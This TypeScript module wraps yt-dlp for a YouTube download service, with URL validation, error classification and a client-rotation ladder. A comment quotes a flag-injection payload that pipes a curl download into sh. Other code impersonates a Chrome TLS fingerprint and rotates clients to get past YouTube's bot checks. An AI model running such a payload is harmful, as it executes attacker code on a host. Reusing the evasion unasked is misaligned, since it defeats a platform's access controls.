import { spawn } from 'child_process';
import path from 'path';
import os from 'os';
import fs from 'fs';
import { env } from '../config/env';

/* -------------------------------------------------------------------------- */
/* Binary resolution                                                          */
/* -------------------------------------------------------------------------- */

/**
 * Resolved once. The previous code ran `fs.existsSync` on every single spawn,
 * which on a shared-CPU free instance is a pointless syscall per download.
 */
const YTDLP_BIN: string = (() => {
  const local = path.join(
    __dirname, '..', '..', 'bin',
    os.platform() === 'win32' ? 'yt-dlp.exe' : 'yt-dlp'
  );
  return fs.existsSync(local) ? local : 'yt-dlp';
})();

export function ytDlpBinary(): string {
  return YTDLP_BIN;
}

/* -------------------------------------------------------------------------- */
/* Typed failures                                                             */
/* -------------------------------------------------------------------------- */

export type ExtractFailure =
  | 'BOT_CHECK'
  | 'RATE_LIMITED'
  | 'AGE_RESTRICTED'
  | 'PRIVATE'
  | 'MEMBERS_ONLY'
  | 'GEO_BLOCKED'
  | 'UNAVAILABLE'
  | 'NOT_YET_AVAILABLE'
  | 'LIVE_STREAM'
  | 'UNSUPPORTED_URL'
  | 'FORMAT_UNAVAILABLE'
  | 'TOO_LONG'
  | 'NETWORK'
  | 'TIMEOUT'
  | 'UNKNOWN';

export class ExtractError extends Error {
  constructor(
    readonly code: ExtractFailure,
    message: string,
    /** True when retrying with a different client could plausibly help. */
    readonly retriable: boolean,
    readonly raw?: string
  ) {
    super(message);
    this.name = 'ExtractError';
  }
}

/**
 * Maps yt-dlp's stderr onto a typed failure.
 *
 * The distinction that matters most is `retriable`. A bot check, a private
 * video and a geo-block are *deterministic* — walking the rest of the client
 * ladder cannot change the answer, it just burns 30 seconds and another few
 * requests against an IP that is already rate-limited. The old code retried
 * everything three times through five clients, which is why a failing download
 * took minutes to report an error the very first attempt already knew.
 */
export function classifyYtDlpError(stderr: string): ExtractError {
  const s = (stderr || '').toLowerCase();

  const match = (code: ExtractFailure, message: string, retriable: boolean) =>
    new ExtractError(code, message, retriable, stderr?.slice(0, 2000));

  if (s.includes("confirm you're not a bot") || s.includes('confirm you are not a bot') ||
      s.includes('sign in to confirm')) {
    return match('BOT_CHECK',
      'YouTube is challenging this server with a bot check. This is an IP-reputation block on the hosting provider, not a problem with the link.',
      false);
  }
  if (s.includes('http error 429') || s.includes('too many requests')) {
    return match('RATE_LIMITED', 'YouTube is rate-limiting this server. Try again in a few minutes.', false);
  }
  if (s.includes('age') && (s.includes('confirm your age') || s.includes('age-restricted') || s.includes('inappropriate for some users'))) {
    return match('AGE_RESTRICTED', 'This video is age-restricted and needs a signed-in account to download.', true);
  }
  if (s.includes('private video') || s.includes('this video is private')) {
    return match('PRIVATE', 'This video is private.', false);
  }
  if (s.includes('members-only') || s.includes('join this channel')) {
    return match('MEMBERS_ONLY', 'This video is for channel members only.', false);
  }
  if (s.includes('not available in your country') || s.includes('blocked it in your country') ||
      s.includes('geo restricted') || s.includes('geo-restricted')) {
    return match('GEO_BLOCKED', 'This video is not available in the server\'s region.', false);
  }
  if (s.includes('is not yet available') || s.includes('premieres in') || s.includes('will begin in')) {
    return match('NOT_YET_AVAILABLE', 'This video has not premiered yet.', false);
  }
  if (s.includes('live event') || s.includes('is live') || s.includes('live stream')) {
    return match('LIVE_STREAM', 'Live streams cannot be downloaded.', false);
  }
  if (s.includes('unsupported url') || s.includes('is not a valid url')) {
    return match('UNSUPPORTED_URL', 'That link is not supported.', false);
  }
  if (s.includes('requested format is not available') || s.includes('no video formats found')) {
    return match('FORMAT_UNAVAILABLE', 'The requested quality is not available for this video.', true);
  }
  if (s.includes('video unavailable') || s.includes('has been removed') || s.includes('account associated with this video has been terminated')) {
    return match('UNAVAILABLE', 'This video is unavailable or has been removed.', false);
  }
  if (s.includes('unable to download webpage') || s.includes('connection reset') ||
      s.includes('timed out') || s.includes('temporary failure in name resolution') ||
      s.includes('connection refused')) {
    return match('NETWORK', 'Could not reach YouTube. This is usually temporary.', true);
  }

  return match('UNKNOWN', 'The download failed for an unexpected reason.', true);
}

/* -------------------------------------------------------------------------- */
/* Input validation                                                            */
/* -------------------------------------------------------------------------- */

const ALLOWED_PROTOCOLS = new Set(['http:', 'https:']);

/**
 * Validates an untrusted URL before it is ever handed to yt-dlp.
 *
 * This is a remote-code-execution guard, not a tidiness check. yt-dlp parses
 * its positional arguments as options when they begin with a dash, and it
 * supports `--exec`, which runs an arbitrary shell command per downloaded
 * file. Posting `{"url": "--exec=curl attacker.sh | sh"}` to an endpoint that
 * appended the value straight into the argv array was therefore command
 * execution on the container — using `spawn` with an array prevents shell
 * *metacharacter* injection but does nothing about *flag* injection.
 *
 * Two independent defences: reject anything that is not a plain http(s) URL
 * here, and pass `--` before positional arguments in buildArgs() so that even
 * a value that slipped through is treated as a URL.
 */
export function assertSafeUrl(raw: unknown): string {
  if (typeof raw !== 'string') {
    throw new ExtractError('UNSUPPORTED_URL', 'A URL is required.', false);
  }
  const trimmed = raw.trim();

  if (!trimmed || trimmed.length > 2048) {
    throw new ExtractError('UNSUPPORTED_URL', 'A URL is required.', false);
  }
  if (trimmed.startsWith('-')) {
    throw new ExtractError('UNSUPPORTED_URL', 'That is not a valid URL.', false);
  }
  // Control characters and whitespace have no business in a URL and are the
  // usual vehicle for smuggling a second argument through.
  if (/[\s\x00-\x1F\x7F]/.test(trimmed)) {
    throw new ExtractError('UNSUPPORTED_URL', 'That is not a valid URL.', false);
  }

  let parsed: URL;
  try {
    parsed = new URL(trimmed);
  } catch {
    throw new ExtractError('UNSUPPORTED_URL', 'That is not a valid URL.', false);
  }

  if (!ALLOWED_PROTOCOLS.has(parsed.protocol)) {
    throw new ExtractError('UNSUPPORTED_URL', 'Only http and https links are supported.', false);
  }
  // Block requests aimed back at the container or the cloud metadata service.
  const host = parsed.hostname.toLowerCase();
  if (
    host === 'localhost' || host === '0.0.0.0' || host === '::1' ||
    host.endsWith('.localhost') || host.endsWith('.internal') ||
    /^127\./.test(host) || /^10\./.test(host) || /^192\.168\./.test(host) ||
    /^169\.254\./.test(host) ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(host)
  ) {
    throw new ExtractError('UNSUPPORTED_URL', 'That host is not allowed.', false);
  }

  return parsed.toString();
}

/** Extracts an 11-character YouTube video id from any of its URL shapes. */
export function parseYouTubeId(input: string): string | null {
  const trimmed = (input || '').trim();
  if (!trimmed) return null;
  if (/^[0-9A-Za-z_-]{11}$/.test(trimmed)) return trimmed;

  try {
    const parsed = new URL(trimmed.startsWith('http') ? trimmed : `https://${trimmed}`);
    const host = parsed.hostname.replace(/^www\./, '').replace(/^m\./, '');

    if (host === 'youtu.be') {
      const id = parsed.pathname.split('/').filter(Boolean)[0];
      return /^[0-9A-Za-z_-]{11}$/.test(id || '') ? id : null;
    }
    if (host === 'youtube.com' || host === 'music.youtube.com' || host === 'youtube-nocookie.com') {
      const watchId = parsed.searchParams.get('v');
      if (/^[0-9A-Za-z_-]{11}$/.test(watchId || '')) return watchId;

      const parts = parsed.pathname.split('/').filter(Boolean);
      for (let i = 1; i < parts.length; i++) {
        if (['shorts', 'embed', 'live', 'v'].includes(parts[i - 1]) &&
            /^[0-9A-Za-z_-]{11}$/.test(parts[i])) {
          return parts[i];
        }
      }
    }
  } catch {
    const m = trimmed.match(/(?:v=|youtu\.be\/|shorts\/|embed\/|live\/)([0-9A-Za-z_-]{11})/);
    return m?.[1] || null;
  }
  return null;
}

export function isYouTubeUrl(url: string): boolean {
  try {
    const host = new URL(url).hostname.replace(/^www\./, '').replace(/^m\./, '');
    return ['youtube.com', 'youtu.be', 'music.youtube.com', 'youtube-nocookie.com'].includes(host);
  } catch {
    return false;
  }
}

/* -------------------------------------------------------------------------- */
/* Client ladder                                                               */
/* -------------------------------------------------------------------------- */

/**
 * Extraction clients, tried in order.
 *
 * Per yt-dlp's PO Token guide these need no token and no cookies, which is the
 * only thing that works from a hosting provider with no signed-in session:
 *   android_vr  - no token required; the notable gap is "Made for kids" videos
 *   tv_simply   - lightweight TV surface, no token
 *   web_safari  - its HLS formats are exempt from the GVS token requirement
 *   tv_embedded - works for embeddable videos, helps with some age gates
 * 'default' lets yt-dlp choose, which is the right final rung because its
 * defaults track YouTube's changes faster than this list will.
 *
 * Retrying the *same* client is pointless: a bot-detection rejection is
 * deterministic, not transient. Each rung must therefore be a different client.
 */
const DEFAULT_LADDER = ['android_vr', 'tv_simply', 'web_safari', 'tv_embedded', 'default'];

/**
 * Clients that only become useful once a PO token source exists.
 *
 * The `web` family is what YouTube serves browsers, so it exposes the fullest
 * set of formats — but it is also where the token requirement is enforced
 * hardest. Attempting these without a provider burns a ladder rung on a
 * deterministic rejection, which is why they are appended rather than listed
 * in DEFAULT_LADDER: the ladder grows a rung precisely when that rung can work.
 */
const POT_DEPENDENT_CLIENTS = ['web', 'mweb'];

/** Clients that never need a token, used when the provider is unavailable. */
const TOKENLESS_CLIENTS = new Set(['android_vr', 'tv_simply', 'tv_embedded', 'default']);

const CONFIGURED_LADDER: string[] = (process.env.YT_CLIENT_LADDER || DEFAULT_LADDER.join(','))
  .split(',').map(s => s.trim()).filter(Boolean);

/**
 * How PO tokens are currently obtainable, if at all.
 *
 * Deliberately not just `Boolean(env.youtube.potProviderUrl)`. A configured URL
 * says someone intended a provider to exist, not that one does, and passing a
 * provider argument that points at a closed port made yt-dlp exhaust its retry
 * budget on connection refusals and then report a generic extraction failure —
 * identical in appearance to being blocked by YouTube. This is set only after
 * the generator has been verified, and cleared if it stops being usable.
 */
export type PotMode = 'none' | 'script' | 'http';

let potMode: PotMode = 'none';

export function setPotMode(mode: PotMode): void {
  if (potMode !== mode) {
    console.log(`[ytdlp] PO token source: ${mode}`);
  }
  potMode = mode;
}

export function getPotMode(): PotMode {
  return potMode;
}

export function isPotProviderReady(): boolean {
  return potMode !== 'none';
}

/**
 * Determines how tokens can be generated, preferring script mode.
 *
 * Script mode spawns the generator per extraction and lets it exit, so it costs
 * memory only while it runs. HTTP mode keeps a second Node process resident for
 * the life of the container — about 130MB that competes with ffmpeg during a
 * merge, which on a 512MB box is the difference between finishing a job and
 * being OOM-killed. So an external HTTP provider is used only when no local
 * script is available.
 *
 * Called at boot and on a timer from app.ts, so the ladder reflects what is
 * actually usable rather than what was usable when the container started.
 */
export async function probePotProvider(): Promise<boolean> {
  const home = env.youtube.potServerHome;
  if (home) {
    const script = path.join(home, 'build', 'generate_once.js');
    if (fs.existsSync(script)) {
      setPotMode('script');
      return true;
    }
  }

  const base = env.youtube.potProviderUrl;
  if (base) {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 4000);
      const response = await fetch(`${base.replace(/\/$/, '')}/ping`, { signal: controller.signal });
      clearTimeout(timer);
      if (response.ok) {
        setPotMode('http');
        return true;
      }
    } catch {
      // Falls through to 'none'.
    }
  }

  setPotMode('none');
  return false;
}

/** The ladder as it applies right now, given provider availability. */
export function currentLadder(): string[] {
  if (potMode !== 'none') {
    const extra = POT_DEPENDENT_CLIENTS.filter(c => !CONFIGURED_LADDER.includes(c));
    return [...CONFIGURED_LADDER, ...extra];
  }
  // No token source, so drop the rungs that cannot succeed without one. A
  // cookie jar substitutes for a provider on the web clients, so it counts.
  if (getCookieFile()) return [...CONFIGURED_LADDER];
  return CONFIGURED_LADDER.filter(c => TOKENLESS_CLIENTS.has(c) || c.startsWith('web_safari'));
}

/** Retained for callers that want the raw configured list. */
export const CLIENT_LADDER = CONFIGURED_LADDER;

/**
 * Remembers which client last worked, so the common case costs one attempt
 * instead of walking the ladder from the top every single time. Reset after
 * 30 minutes because YouTube's enforcement shifts underneath us.
 */
let preferredClient: { name: string; at: number } | null = null;
const PREFERRED_TTL_MS = 30 * 60 * 1000;

export function orderedClients(): string[] {
  const ladder = currentLadder();
  if (preferredClient && Date.now() - preferredClient.at < PREFERRED_TTL_MS) {
    const name = preferredClient.name;
    if (ladder.includes(name)) {
      return [name, ...ladder.filter(c => c !== name)];
    }
  }
  preferredClient = null;
  return ladder;
}

export function rememberWorkingClient(name: string): void {
  preferredClient = { name, at: Date.now() };
}

/* -------------------------------------------------------------------------- */
/* Cookies                                                                     */
/* -------------------------------------------------------------------------- */

let cookieFileCache: { path: string | null; at: number } | null = null;
const COOKIE_TTL_MS = 5 * 60 * 1000;

/**
 * Resolves a Netscape cookie jar, if one is configured.
 *
 * Note what is deliberately absent: there is no longer a headless-Chromium
 * step that manufactures a jar on the server. Logged-out visitor cookies
 * harvested from a datacenter IP do not defeat a bot check — they give YouTube
 * a *stable identifier* to attach the rate limit to, so they make detection
 * measurably worse, and launching Chromium every 30 minutes on a 512MB
 * instance competed for memory with ffmpeg. Only a real, externally supplied
 * jar is worth anything here.
 */
export function getCookieFile(): string | null {
  if (cookieFileCache && Date.now() - cookieFileCache.at < COOKIE_TTL_MS) {
    return cookieFileCache.path;
  }

  let resolved: string | null = null;
  try {
    if (env.youtube.cookieFile && fs.existsSync(env.youtube.cookieFile)) {
      resolved = env.youtube.cookieFile;
    } else if (env.youtube.cookiesB64) {
      const target = path.join(os.tmpdir(), 'yt-cookies.txt');
      const decoded = Buffer.from(env.youtube.cookiesB64, 'base64').toString('utf8');
      if (!decoded.includes('\t')) {
        console.warn('[ytdlp] YOUTUBE_COOKIES_B64 does not look like a Netscape cookies.txt — ignoring it');
      } else {
        fs.writeFileSync(target, decoded, { mode: 0o600 });
        resolved = target;
      }
    }
  } catch (e: any) {
    console.warn('[ytdlp] could not prepare cookie file:', e?.message);
  }

  cookieFileCache = { path: resolved, at: Date.now() };
  return resolved;
}

/* -------------------------------------------------------------------------- */
/* Argument construction                                                       */
/* -------------------------------------------------------------------------- */

export interface RunOptions {
  /** Extraction client for this attempt. */
  client?: string;
  /** Overall wall-clock limit in ms. */
  timeoutMs?: number;
  /** Called with each stdout line, for progress parsing. */
  onStdout?: (line: string) => void;
}

/**
 * Builds the full argv for a yt-dlp invocation.
 *
 * `urls` are appended after a `--` terminator so they can never be read as
 * options, regardless of what validation upstream did or did not do.
 */
export function buildArgs(flags: string[], urls: string[], client?: string): string[] {
  const args: string[] = [
    // Fetches yt-dlp's JS challenge solver and gives it a runtime. Without
    // both, signature and n-parameter deciphering fail and every resolved
    // format URL returns 403.
    '--remote-components', 'ejs:github',
    '--js-runtimes', env.youtube.jsRuntime,

    '--socket-timeout', '20',
    '--retries', '2',
    '--extractor-retries', '2',
    '--fragment-retries', '5',

    // curl_cffi is installed in the image specifically for this flag: it gives
    // requests a real Chrome TLS/JA3 fingerprint instead of Python's. It was
    // installed but never actually passed, so the image paid the dependency
    // cost without getting the benefit.
    '--impersonate', 'chrome',

    // Stay under YouTube's guest request ceiling on bursty traffic.
    '--sleep-requests', process.env.YT_SLEEP_REQUESTS || '1',

    '--no-warnings',
    '--no-playlist',
    '--no-progress',
    '--force-ipv4',
  ];

  if (client && client !== 'default') {
    args.push('--extractor-args', `youtube:player_client=${client}`);
  }

  const cookieFile = getCookieFile();
  if (cookieFile) args.push('--cookies', cookieFile);

  if (env.youtube.proxyUrl) args.push('--proxy', env.youtube.proxyUrl);

  // Only passed once the generator has been verified. Advertising a provider we
  // have not checked made every extraction spend its retry budget on a refused
  // connection and then fail as if YouTube had blocked us.
  if (potMode === 'script') {
    // The generator is spawned per call and exits, so it costs memory for a few
    // seconds instead of holding ~130MB resident the way the HTTP server does.
    args.push('--extractor-args', `youtubepot-bgutilscript:server_home=${env.youtube.potServerHome}`);
  } else if (potMode === 'http' && env.youtube.potProviderUrl) {
    args.push('--extractor-args', `youtubepot-bgutilhttp:base_url=${env.youtube.potProviderUrl}`);
  }

  args.push(...flags);

  // Everything after `--` is positional. This is the second RCE guard.
  args.push('--', ...urls);
  return args;
}

/* -------------------------------------------------------------------------- */
/* Execution                                                                   */
/* -------------------------------------------------------------------------- */

export interface RunResult {
  stdout: string;
  stderr: string;
}

/**
 * Runs yt-dlp once, with a hard wall-clock timeout.
 *
 * The timeout matters more than it looks: yt-dlp can sit in a retry loop well
 * past any HTTP client's patience, and the old implementation had no upper
 * bound at all, so a wedged extraction held a queue slot until the instance
 * restarted.
 */
export function runYtDlp(
  flags: string[],
  urls: string[],
  options: RunOptions = {}
): Promise<RunResult> {
  const { client, timeoutMs = 120_000, onStdout } = options;

  return new Promise((resolve, reject) => {
    const child = spawn(YTDLP_BIN, buildArgs(flags, urls, client), {
      windowsHide: true,
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    let stdout = '';
    let stderr = '';
    let settled = false;
    let stdoutTail = '';

    const timer = setTimeout(() => {
      if (settled) return;
      settled = true;
      child.kill('SIGKILL');
      reject(new ExtractError('TIMEOUT', 'The download timed out.', true, stderr.slice(0, 2000)));
    }, timeoutMs);

    const finish = (fn: () => void) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      fn();
    };

    child.stdout.on('data', chunk => {
      const text = chunk.toString();
      stdout += text;
      if (onStdout) {
        stdoutTail += text;
        const lines = stdoutTail.split('\n');
        stdoutTail = lines.pop() ?? '';
        for (const line of lines) onStdout(line);
      }
    });

    child.stderr.on('data', chunk => {
      stderr += chunk.toString();
      // Bound the buffer: a fragment-retry storm can emit megabytes of stderr,
      // and holding all of it defeats the point of a 256MB heap cap.
      if (stderr.length > 64_000) stderr = stderr.slice(-32_000);
    });

    child.on('error', err => {
      finish(() => {
        const message = (err as NodeJS.ErrnoException).code === 'ENOENT'
          ? 'yt-dlp is not installed on this server.'
          : `Could not start yt-dlp: ${err.message}`;
        reject(new ExtractError('UNKNOWN', message, false, err.message));
      });
    });

    child.on('close', code => {
      finish(() => {
        if (code === 0) resolve({ stdout, stderr });
        else reject(classifyYtDlpError(stderr || stdout));
      });
    });
  });
}

/**
 * Runs yt-dlp against each client in turn until one succeeds.
 *
 * Stops immediately on a non-retriable failure. Reports the *first*
 * non-retriable error rather than the last one seen, because "this video is
 * private" is the useful answer and whatever the final rung said about
 * formats is noise.
 */
export async function runWithClientLadder(
  flags: string[],
  urls: string[],
  options: Omit<RunOptions, 'client'> = {}
): Promise<RunResult & { client: string }> {
  const clients = orderedClients();
  let lastError: ExtractError | null = null;

  for (const client of clients) {
    try {
      const result = await runYtDlp(flags, urls, { ...options, client });
      rememberWorkingClient(client);
      return { ...result, client };
    } catch (error) {
      const err = error instanceof ExtractError
        ? error
        : new ExtractError('UNKNOWN', String((error as Error)?.message || error), true);

      console.warn(`[ytdlp] client=${client} failed: ${err.code} — ${err.message}`);

      if (!err.retriable) throw err;
      lastError = err;
    }
  }

  throw lastError ?? new ExtractError('UNKNOWN', 'Extraction failed.', false);
}
